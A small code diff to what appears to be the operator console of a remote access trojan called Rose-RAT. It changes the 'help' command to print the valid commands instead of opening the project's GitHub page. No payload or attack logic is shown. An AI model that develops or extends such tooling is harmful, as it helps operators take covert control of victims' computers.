@@ -97,6 +97,7 @@ class Connected():
 class Serv():
     sio = socketio.Client()
     def __init__(self, url):
+        self.command = Command()
         self.v = __version__
         self._cmd = Command()
         self.url = url
@@ -131,7 +132,12 @@ class Serv():
             self.sio.emit("number_connected")
             cmd = Write.Input("\n    .$ ", Colors.red_to_white, interval=0.025)
             if cmd == "help":
-                webbrowser.open("https://github.com/DamagingRose/Rose-RAT")
+                valid_commands = self.command.valid
+                print(Colorate.Horizontal(Colors.red_to_white, f"     Valid commands:"))
+                for command in valid_commands:
+                    print(Colorate.Horizontal(Colors.red_to_white, f"    - {command}"))
+                print(Colorate.Horizontal(Colors.red_to_white, f"    Press Enter to continue..."))
+                input()
                 self.home()
                 
             elif cmd == "exit":
